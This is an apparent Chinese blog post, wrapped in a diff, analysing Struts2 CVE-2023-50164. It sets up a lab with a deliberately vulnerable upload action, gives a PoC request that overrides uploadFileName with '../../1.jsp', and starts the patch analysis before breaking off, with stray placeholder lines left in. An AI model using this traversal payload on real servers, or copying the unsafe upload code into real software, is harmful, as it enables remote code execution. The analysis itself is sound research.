@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="CVE-2023-50164、S2-066，在Struts2的文件上传FileUploadInterceptor 处理过程中，为了方便用户会自动将上传的文件、文件名、参数等通过setter方式赋值给用户的逻辑，而这部分可以通过用户传递的文件名参数、覆盖Strust2自动设置的文件名的方式来绕过Struts2的文件名限制，进行目录穿越进而达到RCE的效果。
+An attacker can manipulate file upload params to enable paths traversal and under some circumstances this can lead to uploading a malicious file which can be used to perform Remote Code Execution.
+https://cwiki.apache.org/confluence/display/WW/S2-066
+影响版本：
+Struts 2.0.0 - Struts 2.3.37 Struts 2.5.0 - Struts 2.5.32 Struts 6.0.0 - Struts 6.3.0 环境搭建 # Struts2 配置文件，定义了路径、处理方法、前端页面
+&lt;!DOCTYPE struts PUBLIC &#34;-//Apache Software Foundation//DTD Struts Configuration 6.0//EN&#34; &#34;https://struts.apache.org/dtds/struts-6.0.dtd&#34;&gt; &lt;struts&gt; &lt;package name=&#34;fileupload&#34; extends=&#34;struts-default&#34; namespace=&#34;/fileupload&#34;&gt; &lt;action name=&#34;doUpload&#34; class=&#34;org.">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Struts Upload RCE (CVE-2023-50164)" />
+<meta property="og:description" content="CVE-2023-50164、S2-066，在Struts2的文件上传FileUploadInterceptor 处理过程中，为了方便用户会自动将上传的文件、文件名、参数等通过setter方式赋值给用户的逻辑，而这部分可以通过用户传递的文件名参数、覆盖Strust2自动设置的文件名的方式来绕过Struts2的文件名限制，进行目录穿越进而达到RCE的效果。
+An attacker can manipulate file upload params to enable paths traversal and under some circumstances this can lead to uploading a malicious file which can be used to perform Remote Code Execution.
+https://cwiki.apache.org/confluence/display/WW/S2-066
+影响版本：
+Struts 2.0.0 - Struts 2.3.37 Struts 2.5.0 - Struts 2.5.32 Struts 6.0.0 - Struts 6.3.0 环境搭建 # Struts2 配置文件，定义了路径、处理方法、前端页面
+&lt;!DOCTYPE struts PUBLIC &#34;-//Apache Software Foundation//DTD Struts Configuration 6.0//EN&#34; &#34;https://struts.apache.org/dtds/struts-6.0.dtd&#34;&gt; &lt;struts&gt; &lt;package name=&#34;fileupload&#34; extends=&#34;struts-default&#34; namespace=&#34;/fileupload&#34;&gt; &lt;action name=&#34;doUpload&#34; class=&#34;org." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hoo1ng.github.io/docs/code-audit/Struts2-Upload-RCE/" /><meta property="article:section" content="docs" />
+
+<meta property="article:modified_time" content="2023-12-18T18:31:35+08:00" />
+<title>Struts Upload RCE (CVE-2023-50164) | Hoo1ng&#39;s Blog</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" >
+<link rel="stylesheet" href="/book.min.33a48f5432973b8ff9a82679d9e45d67f2c15d4399bd2829269455cfe390b5e8.css" integrity="sha256-M6SPVDKXO4/5qCZ52eRdZ/LBXUOZvSgpJpRVz&#43;OQteg=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/zh.search.min.daa5f2b25c6810b95f840a62723f589e2f5cc1bbf104b812789d897bf9abd9ac.js" integrity="sha256-2qXyslxoELlfhApicj9Yni9cwbvxBLgSeJ2Je/mr2aw=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><span>Hoo1ng&#39;s Blog</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="搜索" aria-label="搜索" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  <ul>
+<li>
+  <a href="/docs/"><strong>Table of Contents</strong></a>
+<ul>
+<li>
+  <a href="/docs/code-audit/"><strong>Code Audit</strong></a>
+<ul>
+<li>
+  <a href="/docs/code-audit/Struts2-Upload-RCE/"class=active>Struts2 Upload RCE (CVE-2023-50164)</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="https://github.com/alex-shpak/hugo-book"  target="_blank" rel="noopener">
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://themes.gohugo.io/hugo-book/"  target="_blank" rel="noopener">
+        Hugo Themes
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Struts Upload RCE (CVE-2023-50164)</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#环境搭建">环境搭建</a></li>
+    <li><a href="#poc及利用条件">POC及利用条件</a></li>
+    <li><a href="#漏洞分析">漏洞分析</a></li>
+    <li><a href="#还有没有其他的">还有没有其他的</a></li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><p><strong>CVE-2023-50164</strong>、<strong>S2-066</strong>，在Struts2的文件上传<code>FileUploadInterceptor</code> 处理过程中，为了方便用户会自动将上传的文件、文件名、参数等通过setter方式赋值给用户的逻辑，而这部分可以通过用户传递的文件名参数、覆盖Strust2自动设置的文件名的方式来绕过Struts2的文件名限制，进行目录穿越进而达到RCE的效果。</p>
+<blockquote>
+<p>An attacker can manipulate file upload params to enable paths traversal and under some circumstances this can lead to uploading a malicious file which can be used to perform Remote Code Execution.</p>
+<p>
+  <a href="https://cwiki.apache.org/confluence/display/WW/S2-066">https://cwiki.apache.org/confluence/display/WW/S2-066</a></p>
+</blockquote>
+<p>影响版本：</p>
+<ul>
+<li>Struts 2.0.0 - Struts 2.3.37</li>
+<li>Struts 2.5.0 - Struts 2.5.32</li>
+<li>Struts 6.0.0 - Struts 6.3.0</li>
+</ul>
+<h1 id="环境搭建">
+  环境搭建
+  <a class="anchor" href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba">#</a>
+</h1>
+<p>Struts2 配置文件，定义了路径、处理方法、前端页面</p>
+<pre tabindex="0"><code>&lt;!DOCTYPE struts PUBLIC
+	&#34;-//Apache Software Foundation//DTD Struts Configuration 6.0//EN&#34;
+	&#34;https://struts.apache.org/dtds/struts-6.0.dtd&#34;&gt;
+
+&lt;struts&gt;
+	&lt;package name=&#34;fileupload&#34; extends=&#34;struts-default&#34; namespace=&#34;/fileupload&#34;&gt;
+        &lt;action name=&#34;doUpload&#34; class=&#34;org.apache.struts2.showcase.fileupload.FileUploadAction&#34; method=&#34;upload&#34;&gt;
+        	&lt;result name=&#34;input&#34;&gt;/WEB-INF/fileupload/upload.jsp&lt;/result&gt;
+			&lt;result&gt;/WEB-INF/fileupload/upload-success.jsp&lt;/result&gt;
+		&lt;/action&gt;
+
+    &lt;/package&gt;
+&lt;/struts&gt;
+</code></pre><p>前端jsp ，注意<code>&lt;s:file name=&quot;upload&quot; label=&quot;File&quot;/&gt;</code> 表示字段名是<code>upload</code></p>
+<pre tabindex="0"><code class="language-jsp" data-lang="jsp">&lt;%@ taglib prefix=&#34;s&#34; uri=&#34;/struts-tags&#34; %&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Struts2 Showcase - Fileupload sample&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;div class=&#34;page-header&#34;&gt;
+	    &lt;h1&gt;Fileupload sample&lt;/h1&gt;
+    &lt;/div&gt;
+
+    &lt;div class=&#34;container-fluid&#34;&gt;
+	    &lt;div class=&#34;row&#34;&gt;
+		    &lt;div class=&#34;col-md-12&#34;&gt;
+			    &lt;s:actionerror cssClass=&#34;alert alert-error&#34;/&gt;
+				&lt;s:fielderror cssClass=&#34;alert alert-error&#34;/&gt;
+			    &lt;s:form action=&#34;doUpload&#34; method=&#34;POST&#34; enctype=&#34;multipart/form-data&#34;&gt;
+			        &lt;s:file name=&#34;upload&#34; label=&#34;File&#34;/&gt;
+			        &lt;s:textfield name=&#34;caption&#34; label=&#34;Caption&#34;/&gt;
+			        &lt;s:submit cssClass=&#34;btn btn-primary&#34;/&gt;
+			    &lt;/s:form&gt;
+		    &lt;/div&gt;
+	    &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>业务处理逻辑，Struts2会自动将上传的文件传递给下面的upload字段，文件名赋值给fileName字段等。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> org.apache.struts2.showcase.fileupload<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.opensymphony.xwork2.ActionSupport<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.io.FileUtils<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.struts2.ServletActionContext<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.File<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Show case File Upload example&#39;s action. &lt;code&gt;FileUploadAction&lt;/code&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FileUploadAction</span> <span style="color:#66d9ef">extends</span> ActionSupport <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">long</span> serialVersionUID <span style="color:#f92672">=</span> <span style="color:#ae81ff">5156288255337069381L</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">private</span> String contentType<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">private</span> File upload<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">private</span> String fileName<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">private</span> String caption<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">input</span><span style="color:#f92672">()</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> SUCCESS<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">upload</span><span style="color:#f92672">()</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>		String path <span style="color:#f92672">=</span> ServletActionContext<span style="color:#f92672">.</span><span style="color:#a6e22e">getServletContext</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getRealPath</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">)+</span><span style="color:#e6db74">&#34;upload&#34;</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>		System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;this.getUploadFileName(): &#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getUploadFileName</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>		System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;upload path: &#34;</span> <span style="color:#f92672">+</span> path<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>		String realPath <span style="color:#f92672">=</span> path <span style="color:#f92672">+</span> File<span style="color:#f92672">.</span><span style="color:#a6e22e">separator</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getUploadFileName</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>			FileUtils<span style="color:#f92672">.</span><span style="color:#a6e22e">copyFile</span><span style="color:#f92672">(</span>upload<span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> File<span style="color:#f92672">(</span>realPath<span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>			e<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> SUCCESS<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// since we are using &lt;s:file name=&#34;upload&#34; .../&gt; the file name will be
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// obtained through getter/setter of &lt;file-tag-name&gt;FileName
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getUploadFileName</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> fileName<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setUploadFileName</span><span style="color:#f92672">(</span>String fileName<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">fileName</span> <span style="color:#f92672">=</span> fileName<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// since we are using &lt;s:file name=&#34;upload&#34; ... /&gt; the content type will be
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// obtained through getter/setter of &lt;file-tag-name&gt;ContentType
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getUploadContentType</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> contentType<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setUploadContentType</span><span style="color:#f92672">(</span>String contentType<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">contentType</span> <span style="color:#f92672">=</span> contentType<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// since we are using &lt;s:file name=&#34;upload&#34; ... /&gt; the File itself will be
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// obtained through getter/setter of &lt;file-tag-name&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">public</span> File <span style="color:#a6e22e">getUpload</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> upload<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setUpload</span><span style="color:#f92672">(</span>File upload<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">upload</span> <span style="color:#f92672">=</span> upload<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getCaption</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> caption<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setCaption</span><span style="color:#f92672">(</span>String caption<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">caption</span> <span style="color:#f92672">=</span> caption<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">getUploadSize</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>upload <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> upload<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><h1 id="poc及利用条件">
+  POC及利用条件
+  <a class="anchor" href="#poc%e5%8f%8a%e5%88%a9%e7%94%a8%e6%9d%a1%e4%bb%b6">#</a>
+</h1>
+<p>POC：</p>
+<p>注意 <code>uploadFileName</code> 这是上面的代码中由Strust2自动赋值过来的参数，下面通过手动传递进行覆盖</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /struts2_showcase_war/fileupload/doUpload.action <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">localhost:8080</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">multipart/form-data; boundary=---------------------------21972861871679732823856174094</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">472</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://localhost:8080</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://localhost:8080/struts2_showcase_war/fileupload/upload.action</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">JSESSIONID=5B04BC8FA13D0717C172C4AF150FB093</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Dest<span style="color:#f92672">:</span> <span style="color:#ae81ff">document</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Mode<span style="color:#f92672">:</span> <span style="color:#ae81ff">navigate</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Site<span style="color:#f92672">:</span> <span style="color:#ae81ff">same-origin</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-User<span style="color:#f92672">:</span> <span style="color:#ae81ff">?1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----------------------------21972861871679732823856174094
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;Upload&#34;; filename=&#34;11111.txt&#34;
+</span></span><span style="display:flex;"><span>Content-Type: text/plain
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>1111
+</span></span><span style="display:flex;"><span>-----------------------------21972861871679732823856174094
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data;  name=&#34;uploadFileName&#34;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>../../1.jsp
+</span></span><span style="display:flex;"><span>-----------------------------21972861871679732823856174094
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;caption&#34;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>3333
+</span></span><span style="display:flex;"><span>-----------------------------21972861871679732823856174094--
+</span></span></code></pre></div><p><strong>利用条件：</strong></p>
+<ol>
+<li>
+<p>首先要知道 文件上传代码中的文件名字段名， 这里上传名是 <code>upload</code> （由jsp中定义），文件名字段按照习惯可能会是<code>UploadFileName</code> （upload + FileName） ，如果不是则无法覆盖</p>
+<blockquote>
+<p>Content-Disposition: form-data; name=&ldquo;Upload&rdquo;; filename=&ldquo;11111.txt&rdquo;</p>
+<p>Content-Disposition: form-data;  name=&ldquo;uploadFileName&rdquo;</p>
+</blockquote>
+</li>
+<li>
+<p>这个洞的利用点就在通过自己传的文件名覆盖掉Strust2自动赋值的文件名，所以如果原来程序逻辑本来就是获取文件名，根据后缀判断，那这个洞就没法利用了</p>
+<blockquote>
+<p>这么看，其实没有想象的那么严重？</p>
+</blockquote>
+</li>
+</ol>
+<h1 id="漏洞分析">
+  漏洞分析
+  <a class="anchor" href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90">#</a>
+</h1>
+<p>这个补丁这么找来的</p>
+<p>
+  <a href="https://github.com/apache/struts/commit/162e29fee9136f4bfd9b2376da2cbf590f9ea163">https://github.com/apache/struts/commit/162e29fee9136f4bfd9b2376da2cbf590f9ea163</a></p>
+<p><code>org.apache.struts2.interceptor.FileUploadInterceptor#intercept</code> 这里主要提取用户的数据包中的文件、文件名、文件类型字段，</p>
+<p>111</p>
+<p>{{ $image := .Resources.Get &ldquo;image-20231216113402887.png&rdquo; }}</p>
+<p>222</p>
+<p>{{ $image := .Resources.Get &ldquo;Struts2-Upload-RCE.assets/image-20231216113402887.png&rdquo; }}</p>
+<p>333</p>
+<p>
+  <img src="image-20231216113402887.png" alt="image-20231216113402887" /></p>
+<p>444</p>
+<p>
+  <img src="Struts2-Upload-RCE.assets/image-20231216113402887.png" alt="image-20231216113402887" /></p>
+<p>注意，这里的文件名会被安全处理</p>
+<pre tabindex="0"><code>String[] fileName = multiWrapper.getFileNames(inputName);
+</code></pre><p><code>org.apache.struts2.dispatcher.multipart.AbstractMultiPartRequest#getCanonicalName</code> 会将 <code>/</code> 和<code>\</code>的目录遍历payload过滤掉</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> String <span style="color:#a6e22e">getCanonicalName</span><span style="color:#f92672">(</span>String originalFileName<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> forwardSlash <span style="color:#f92672">=</span> originalFileName<span style="color:#f92672">.</span><span style="color:#a6e22e">lastIndexOf</span><span style="color:#f92672">(</span><span style="color:#ae81ff">47</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> backwardSlash <span style="color:#f92672">=</span> originalFileName<span style="color:#f92672">.</span><span style="color:#a6e22e">lastIndexOf</span><span style="color:#f92672">(</span><span style="color:#ae81ff">92</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        String fileName<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>forwardSlash <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> forwardSlash <span style="color:#f92672">&gt;</span> backwardSlash<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            fileName <span style="color:#f92672">=</span> originalFileName<span style="color:#f92672">.</span><span style="color:#a6e22e">substring</span><span style="color:#f92672">(</span>forwardSlash <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            fileName <span style="color:#f92672">=</span> originalFileName<span style="color:#f92672">.</span><span style="color:#a6e22e">substring</span><span style="color:#f92672">(</span>backwardSlash <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> fileName<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
